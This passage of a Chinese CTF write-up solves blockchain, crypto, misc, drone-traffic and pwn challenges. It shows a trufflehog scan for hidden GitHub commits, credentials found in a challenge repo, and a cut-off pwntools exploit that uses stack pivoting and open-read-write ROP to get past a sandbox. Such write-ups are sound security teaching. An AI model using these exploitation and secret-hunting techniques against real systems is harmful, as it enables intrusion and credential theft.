class="literal">True</span>,</span><br><span class="line">                <span class="string">&quot;inputs&quot;</span>: [],</span><br><span class="line">                <span class="string">&quot;name&quot;</span>: <span class="string">&quot;consecutiveWins&quot;</span>,</span><br><span class="line">                <span class="string">&quot;outputs&quot;</span>: [&#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;&quot;</span>, <span class="string">&quot;type&quot;</span>: <span class="string">&quot;uint256&quot;</span>&#125;],</span><br><span class="line">                <span class="string">&quot;payable&quot;</span>: <span class="literal">False</span>,</span><br><span class="line">                <span class="string">&quot;stateMutability&quot;</span>: <span class="string">&quot;view&quot;</span>,</span><br><span class="line">                <span class="string">&quot;type&quot;</span>: <span class="string">&quot;function&quot;</span></span><br><span class="line">            &#125;,</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="string">&quot;constant&quot;</span>: <span class="literal">True</span>,</span><br><span class="line">                <span class="string">&quot;inputs&quot;</span>: [],</span><br><span class="line">                <span class="string">&quot;name&quot;</span>: <span class="string">&quot;verify&quot;</span>,</span><br><span class="line">                <span class="string">&quot;outputs&quot;</span>: [&#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;&quot;</span>, <span class="string">&quot;type&quot;</span>: <span class="string">&quot;address&quot;</span>&#125;, &#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;&quot;</span>, <span class="string">&quot;type&quot;</span>: <span class="string">&quot;uint256&quot;</span>&#125;,</span><br><span class="line">                            &#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;&quot;</span>, <span class="string">&quot;type&quot;</span>: <span class="string">&quot;string&quot;</span>&#125;],</span><br><span class="line">                <span class="string">&quot;payable&quot;</span>: <span class="literal">False</span>,</span><br><span class="line">                <span class="string">&quot;stateMutability&quot;</span>: <span class="string">&quot;view&quot;</span>,</span><br><span class="line">                <span class="string">&quot;type&quot;</span>: <span class="string">&quot;function&quot;</span></span><br><span class="line">            &#125;,</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="string">&quot;inputs&quot;</span>: [&#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;_key&quot;</span>, <span class="string">&quot;type&quot;</span>: <span class="string">&quot;string&quot;</span>&#125;],</span><br><span class="line">                <span class="string">&quot;payable&quot;</span>: <span class="literal">False</span>,</span><br><span class="line">                <span class="string">&quot;stateMutability&quot;</span>: <span class="string">&quot;nonpayable&quot;</span>,</span><br><span class="line">                <span class="string">&quot;type&quot;</span>: <span class="string">&quot;constructor&quot;</span></span><br><span class="line">            &#125;,</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="string">&quot;anonymous&quot;</span>: <span class="literal">False</span>,</span><br><span class="line">                <span class="string">&quot;inputs&quot;</span>: [&#123;<span class="string">&quot;indexed&quot;</span>: <span class="literal">False</span>, <span class="string">&quot;name&quot;</span>: <span class="string">&quot;&quot;</span>, <span class="string">&quot;type&quot;</span>: <span class="string">&quot;address&quot;</span>&#125;,</span><br><span class="line">                           &#123;<span class="string">&quot;indexed&quot;</span>: <span class="literal">False</span>, <span class="string">&quot;name&quot;</span>: <span class="string">&quot;&quot;</span>, <span class="string">&quot;type&quot;</span>: <span class="string">&quot;uint256&quot;</span>&#125;],</span><br><span class="line">                <span class="string">&quot;name&quot;</span>: <span class="string">&quot;ConsecutiveWins&quot;</span>,</span><br><span class="line">                <span class="string">&quot;type&quot;</span>: <span class="string">&quot;event&quot;</span></span><br><span class="line">            &#125;</span><br><span class="line">        ]</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    response = requests.post(url, data=json.dumps(data), headers=headers)</span><br><span class="line">    <span class="keyword">return</span> response.status_code, response.text</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        _, n = get_num()</span><br><span class="line">        n = <span class="built_in">int</span>(<span class="built_in">eval</span>(n)[<span class="number">0</span>])</span><br><span class="line">        <span class="keyword">if</span> n &gt; <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">if</span> n == <span class="number">1</span>:</span><br><span class="line">                <span class="built_in">print</span>()</span><br><span class="line">            <span class="built_in">print</span>(n, end=<span class="string">&quot; &quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> n == <span class="number">10</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        send_guess(random.choice([<span class="literal">True</span>, <span class="literal">False</span>]))</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        sleep(<span class="number">2</span>)</span><br></pre></td></tr></table></figure>

<p><img src="../images/2025-QWNT/37.png" alt="img"></p>
<p>拿到密文是</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">buiqhrvilHwigdClBuiTucduZnXmrLoHleieggbawsgsgcAyaFekhqWmAvqTocwhBuiiARfyurergyhNprwePcHcurmQsmGmqopirdhliaWpdRwIvhRphqgNproiBgGevBaRwfsyifiAlRvQpvglwfsemLQeBzswpnrkhbwmiAsXkcFjWvrXlLtuDbVsiRvyiqStWgcHwsxlLqqilrfCwfCmmqiWlPwhogSxuybMuvXmPncLbnrxPcGmitiWzgHbWhxXkcgfQtlxhQhxiakiUmtNprmvPcGmitiWecWhoeiegzMjWymxlaofwefyVgbyaFvmYyzmmGg</span><br></pre></td></tr></table></figure>

<p>用在线网站爆破密钥</p>
<p><img src="../images/2025-QWNT/38.png" alt="img"></p>
<blockquote>
<p>flag{ineedyou}</p>
</blockquote>
<h1><span id="misc">Misc</span><a href="#misc" class="header-anchor"></a></h1><h2><span id="ciallo-encrypt">Ciallo_Encrypt</span><a href="#ciallo-encrypt" class="header-anchor"></a></h2><p>日志中base64解码恢复内容</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">5qC45b+D5Luj56CB5oiR5bey5bCG5YW25pS+6L+b5LqGZm9ya+eahOengeS6uuS7k+W6k+mHjA==</span><br><span class="line">核心代码我已将其放进了fork的私人仓库里</span><br></pre></td></tr></table></figure>

<p>去github上查找对应的项目，给出了app的基本代码，去commit发现账户对应的用户和密码要求</p>
<p><img src="../images/2025-QWNT/39.png" alt="img"></p>
<p>在issue里提到了qq，简单处理得到</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">3517508570@qq.com</span><br><span class="line">f42e16b836b22e83fd3818b603c75dc6</span><br></pre></td></tr></table></figure>

<p>进去发现有个历史存档的信息，需要尝试解密，根据一开始的提示，需要爆破一下隐藏的commit拿到加密的代码</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">EXPORT GITHUB_TOKEN=ghp_Jk...</span><br><span class="line">./trufflehog github-experimental --repo https://github.com/Yu2ul0ver/Ciallo_Encrypt0r.git --object-discovery</span><br></pre></td></tr></table></figure>

<p><img src="../images/2025-QWNT/40.png" alt="img"></p>
<p>随机访问一个拿到加密逻辑</p>
<p><img src="../images/2025-QWNT/41.png" alt="img"></p>
<p>带上密文和时间戳给ai写解密脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> unpad</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ciallo_decrypt</span>(<span class="params">encoded_text, timestamp</span>):</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;时间戳: <span class="subst">&#123;timestamp&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    patterns = encoded_text.strip().split(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">    binary = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> pattern <span class="keyword">in</span> patterns:</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> pattern:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 基准模板: Ciallo～(∠・ω&lt;)⌒★</span></span><br><span class="line">        bits = [<span class="string">&#x27;0&#x27;</span>] * <span class="number">8</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># bit[0]: pattern[1]==&#x27;1&#x27; -&gt; 1</span></span><br><span class="line">        bits[<span class="number">0</span>] = <span class="string">&#x27;1&#x27;</span> <span class="keyword">if</span> pattern[<span class="number">1</span>] == <span class="string">&#x27;1&#x27;</span> <span class="keyword">else</span> <span class="string">&#x27;0&#x27;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># bit[1]: pattern[2]==&#x27;@&#x27; -&gt; 0, 否则 1</span></span><br><span class="line">        bits[<span class="number">1</span>] = <span class="string">&#x27;0&#x27;</span> <span class="keyword">if</span> pattern[<span class="number">2</span>] == <span class="string">&#x27;@&#x27;</span> <span class="keyword">else</span> <span class="string">&#x27;1&#x27;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># bit[2]: pattern[3]==&#x27;1&#x27; -&gt; 1</span></span><br><span class="line">        bits[<span class="number">2</span>] = <span class="string">&#x27;1&#x27;</span> <span class="keyword">if</span> pattern[<span class="number">3</span>] == <span class="string">&#x27;1&#x27;</span> <span class="keyword">else</span> <span class="string">&#x27;0&#x27;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># bit[3]: pattern[4]==&#x27;1&#x27; -&gt; 1</span></span><br><span class="line">        bits[<span class="number">3</span>] = <span class="string">&#x27;1&#x27;</span> <span class="keyword">if</span> pattern[<span class="number">4</span>] == <span class="string">&#x27;1&#x27;</span> <span class="keyword">else</span> <span class="string">&#x27;0&#x27;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># bit[4]: pattern[5]==&#x27;0&#x27; -&gt; 0, 否则 1</span></span><br><span class="line">        bits[<span class="number">4</span>] = <span class="string">&#x27;0&#x27;</span> <span class="keyword">if</span> pattern[<span class="number">5</span>] == <span class="string">&#x27;0&#x27;</span> <span class="keyword">else</span> <span class="string">&#x27;1&#x27;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># bit[5]: pattern[6]==&#x27;一&#x27; -&gt; 1</span></span><br><span class="line">        bits[<span class="number">5</span>] = <span class="string">&#x27;1&#x27;</span> <span class="keyword">if</span> pattern[<span class="number">6</span>] == <span class="string">&#x27;一&#x27;</span> <span class="keyword">else</span> <span class="string">&#x27;0&#x27;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># bit[6:8]: 根据位置 8,9,10 判断</span></span><br><span class="line">        <span class="keyword">if</span> pattern[<span class="number">9</span>] == <span class="string">&#x27;°&#x27;</span>:</span><br><span class="line">            bits[<span class="number">6</span>], bits[<span class="number">7</span>] = <span class="string">&#x27;0&#x27;</span>, <span class="string">&#x27;0&#x27;</span></span><br><span class="line">        <span class="keyword">elif</span> pattern[<span class="number">8</span>] == <span class="string">&#x27;2&#x27;</span>:</span><br><span class="line">            bits[<span class="number">6</span>], bits[<span class="number">7</span>] = <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;0&#x27;</span></span><br><span class="line">        <span class="keyword">elif</span> pattern[<span class="number">10</span>] == <span class="string">&#x27;w&#x27;</span>:</span><br><span class="line">            bits[<span class="number">6</span>], bits[<span class="number">7</span>] = <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;1&#x27;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            bits[<span class="number">6</span>], bits[<span class="number">7</span>] = <span class="string">&#x27;0&#x27;</span>, <span class="string">&#x27;1&#x27;</span></span><br><span class="line"></span><br><span class="line">        binary += <span class="string">&#x27;&#x27;</span>.join(bits)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;二进制长度: <span class="subst">&#123;<span class="built_in">len</span>(binary)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 第二步：二进制 -&gt; UTF-8 字节</span></span><br><span class="line">    utf8_bytes = <span class="built_in">bytearray</span>()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(binary), <span class="number">8</span>):</span><br><span class="line">        byte_str = binary[i:i + <span class="number">8</span>]</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(byte_str) == <span class="number">8</span>:</span><br><span class="line">            utf8_bytes.append(<span class="built_in">int</span>(byte_str, <span class="number">2</span>))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 第三步：UTF-8 解码 -&gt; Base64</span></span><br><span class="line">    base64_str = utf8_bytes.decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Base64: <span class="subst">&#123;base64_str&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 第四步：Base64 解码 -&gt; AES 密文</span></span><br><span class="line">    ciphertext = base64.b64decode(base64_str)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;AES 密文长度: <span class="subst">&#123;<span class="built_in">len</span>(ciphertext)&#125;</span> 字节&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 第五步：生成密钥并 AES-ECB 解密</span></span><br><span class="line">    ts_str = <span class="built_in">str</span>(timestamp)</span><br><span class="line">    key = hashlib.md5(ts_str.encode()).digest()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;密钥 (MD5 of &#x27;<span class="subst">&#123;ts_str&#125;</span>&#x27;): <span class="subst">&#123;key.<span class="built_in">hex</span>()&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    cipher = AES.new(key, AES.MODE_ECB)</span><br><span class="line">    plaintext_padded = cipher.decrypt(ciphertext)</span><br><span class="line">    plaintext = unpad(plaintext_padded, AES.block_size)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> plaintext.decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 密文</span></span><br><span class="line">ciphertext = <span class="string">&quot;&quot;&quot;Cia110～(∠・ω&lt;)⌒★ Ciall0～(∠・w&lt;)⌒★ Cial10～(∠・ω&lt;)⌒★ Ciall0～(∠・w&lt;)⌒★ Cial10～(2・ω&lt;)⌒★ Ci@110～(∠・ω&lt;)⌒★ Cia11o～(∠・ω&lt;)⌒★ Ci@110一(∠・ω&lt;)⌒★ Cia11o～(∠・ω&lt;)⌒★ Cial10～(∠・ω&lt;)⌒★ Cia11o～(∠・ω&lt;)⌒★ Ciall0～(∠・ω&lt;)⌒★ Cia11o～(∠°ω&lt;)⌒★ Cial10一(∠・w&lt;)⌒★ Ci@11o～(∠・ω&lt;)⌒★ Cial1o～(∠・ω&lt;)⌒★ Cial10一(∠°ω&lt;)⌒★ Cia1l0一(∠・ω&lt;)⌒★ Cial1o～(2・ω&lt;)⌒★ Cial10～(∠・w&lt;)⌒★ Ciallo一(2・ω&lt;)⌒★ Cial1o～(2・ω&lt;)⌒★ Cial10～(2・ω&lt;)⌒★ Cia110～(∠・ω&lt;)⌒★ Ciall0～(∠・w&lt;)⌒★ Ci@110～(∠・w&lt;)⌒★ Cia110～(2・ω&lt;)⌒★ Ci@11o～(∠・ω&lt;)⌒★ Ciall0一(∠°ω&lt;)⌒★ Cial10～(∠・w&lt;)⌒★ Ciallo一(∠・w&lt;)⌒★ Cial10～(∠・w&lt;)⌒★ Ci@1lo～(∠・w&lt;)⌒★ Cia1lo一(∠・w&lt;)⌒★ Ci@110～(∠°ω&lt;)⌒★ Cia110～(∠°ω&lt;)⌒★ Ci@110一(∠°ω&lt;)⌒★ Ci@110一(∠・ω&lt;)⌒★ Cial1o～(∠・ω&lt;)⌒★ Cial10一(2・ω&lt;)⌒★ Cia11o～(∠・ω&lt;)⌒★ Cia110～(∠・ω&lt;)⌒★ Ci@110～(2・ω&lt;)⌒★ Cia1l0～(2・ω&lt;)⌒★ Cia1lo～(2・ω&lt;)⌒★ Cia110一(2・ω&lt;)⌒★ Ciallo～(∠・ω&lt;)⌒★ Cia1lo一(∠°ω&lt;)⌒★ Ciallo～(∠・ω&lt;)⌒★ Cial10～(2・ω&lt;)⌒★ Ciall0～(∠・w&lt;)⌒★ Ciall0～(∠・w&lt;)⌒★ Cia1l0一(∠°ω&lt;)⌒★ Cia110～(∠・w&lt;)⌒★ Cial10一(∠・w&lt;)⌒★ Cia1l0～(∠・ω&lt;)⌒★ Cia1lo～(∠°ω&lt;)⌒★ Cia110一(2・ω&lt;)⌒★ Ciallo～(∠・ω&lt;)⌒★ Ci@110～(2・ω&lt;)⌒★ Ci@110一(∠・ω&lt;)⌒★ Ci@1lo～(∠・w&lt;)⌒★ Cia1l0一(∠°ω&lt;)⌒★ Ciall0～(∠・w&lt;)⌒★&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 时间: 2025-10-16 02:27:33 (北京时间)</span></span><br><span class="line"><span class="comment"># Unix 时间戳</span></span><br><span class="line">timestamp = <span class="number">1760552853</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;=&quot;</span> * <span class="number">70</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;开始解密...&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;=&quot;</span> * <span class="number">70</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    result = ciallo_decrypt(ciphertext, timestamp)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;=&quot;</span> * <span class="number">70</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;✓ 解密成功!&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;=&quot;</span> * <span class="number">70</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;明文: <span class="subst">&#123;result&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;=&quot;</span> * <span class="number">70</span>)</span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;✗ 解密失败: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">import</span> traceback</span><br><span class="line"></span><br><span class="line">    traceback.print_exc()</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#flag&#123;9f08699d-1b6c-471e-9ed0-86dbf3ee8074&#125;</span></span><br></pre></td></tr></table></figure>

<h1><span id="di-kong-jing-ji-wang-luo-an-quan">低空经济网络安全</span><a href="#di-kong-jing-ji-wang-luo-an-quan" class="header-anchor"></a></h1><h2><span id="the-hidden-link">The Hidden Link</span><a href="#the-hidden-link" class="header-anchor"></a></h2><p>全是udp的流量，wirkshark简单的手动分析一下在</p>
<p><img src="../images/2025-QWNT/42.png" alt="img"></p>
<p>类似这样B后面有明文，且刚好能拼成正常的flag的内容，手动补填一下</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">...Bk3d&#125;.</span><br><span class="line">...Bll3r.</span><br><span class="line">...BflagJ</span><br><span class="line">...B&#123;dr0.</span><br><span class="line">...Bt_c0:</span><br><span class="line">...Bntr0.</span><br><span class="line">...B_h4c!</span><br><span class="line">...Bn3_f </span><br><span class="line">...Bl1gh.</span><br></pre></td></tr></table></figure>

<p>是乱序简单的拼接一下就能得到flag</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;dr0n3_fl1ght_c0ntr0ll3r_h4ck3d&#125;</span><br></pre></td></tr></table></figure>

<h1><span id="pwn">Pwn</span><a href="#pwn" class="header-anchor"></a></h1><h2><span id="stack">stack</span><a href="#stack" class="header-anchor"></a></h2><p><img src="../images/2025-QWNT/43.png" alt="img"></p>
<p><img src="../images/2025-QWNT/44.png" alt="img"></p>
<p>sub_401354控制好输入可以泄漏rbp的栈地址。</p>
<p>sub_4013B9存在大量栈溢出。</p>
<p>在sub_4013B9中调试发现栈上存在libc地址：</p>
<p><img src="../images/2025-QWNT/45.png" alt="img"></p>
<p>我们可以通过合理控制rbp回到sub_401354来泄漏libc地址0x75ae10429d90然后顺便回到main函数0x401413，但是这样下一次printf会出现栈对齐问题，所以我们需要栈迁移一次避免调用main函数，而是直接调用sub_401354的read部分。</p>
<p>这样通过合理构造rbp完成栈上的栈迁移，通过sub_401354自带的printf将libc打印出来，然后接上一个sub_4013B9的read部分，再绕开沙盒执行orw即可获得flag：</p>
<p><img src="../images/2025-QWNT/46.png" alt="img"></p>
<p>exp：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#from ctypes import *</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">stre</span>(<span class="params">a</span>) : <span class="keyword">return</span> <span class="built_in">str</span>(a).encode()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ph</span>(<span class="params">a,b=<span class="string">&quot;addr&quot;</span></span>) : <span class="built_in">print</span>(b+<span class="string">&quot;: &quot;</span>+<span class="built_in">hex</span>(a))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">re</span>(<span class="params">a</span>) : <span class="keyword">return</span> p.recv(a)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pre</span>(<span class="params">a</span>) : <span class="built_in">print</span>(p.recv(a))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">reu</span>(<span class="params">a,b=<span class="literal">False</span></span>) : <span class="keyword">return</span> p.recvuntil(a,drop=b)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rel</span>() : <span class="keyword">return</span> p.recvline()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">se</span>(<span class="params">a</span>) : p.send(a)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sea</span>(<span class="params">a,b</span>) : p.sendafter(a,b)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sel</span>(<span class="params">a</span>) : p.sendline(a)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sela</span>(<span class="params">a,b</span>) : p.sendlineafter(a,b)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">op</span>() : p.interactive()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cp</span>() : p.close()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">raddr64</span>() : <span class="keyword">return</span> u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)) </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">raddr32</span>() : <span class="keyword">return</span> u32(p.recv(<span class="number">4</span>))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">raddr_T</span>() : <span class="keyword">return</span> <span class="built_in">int</span>(re(<span class="number">14</span>),<span class="number">16</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">raddr_A</span>() : <span class="keyword">return</span> <span class="built_in">int</span>(reu(<span class="string">b&quot;-&quot;</span>,<span class="literal">True</span>),<span class="number">16</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">orw_rop64</span>(<span class="params">pop_rdi,pop_rsi,pop_rdx,flag_addr,open_addr,read_addr,write_addr</span>):</span><br><span class="line">    orw = p64(pop_rdi) + p64(flag_addr) + p64(pop_rsi) + p64(<span class="number">0</span>) + p64(open_addr)</span><br><span class="line">    orw+= p64(pop_rdi) + p64(<span class="number">3</span>) + p64(pop_rsi) + p64(flag_addr) + p64(pop_rdx) + p64(<span class="number">0x30</span>)</span><br><span class="line">    orw+= p64(read_addr)</span><br><span class="line">    orw+= p64(pop_rdi) + p64(<span class="number">1</span>) + p64(pop_rsi) + p64(flag_addr) + p64(pop_rdx) + p64(<span class="number">0x30</span>)</span><br><span class="line">    orw+= p64(write_addr)</span><br><span class="line">    <span class="keyword">return</span> orw</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getorw</span>(<span class="params">name,buf,Arch</span>) :</span><br><span class="line">    sh=shellcraft.<span class="built_in">open</span>(name)</span><br><span class="line">    sh+=shellcraft.read(<span class="number">3</span>,buf,<span class="number">0x30</span>)</span><br><span class="line">    sh+=shellcraft.write(<span class="number">1</span>,buf,<span class="number">0x30</span>)</span><br><span class="line">    sh=asm(sh,arch=Arch)</span><br><span class="line">    <span class="keyword">return</span> sh</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gdbp</span>(<span 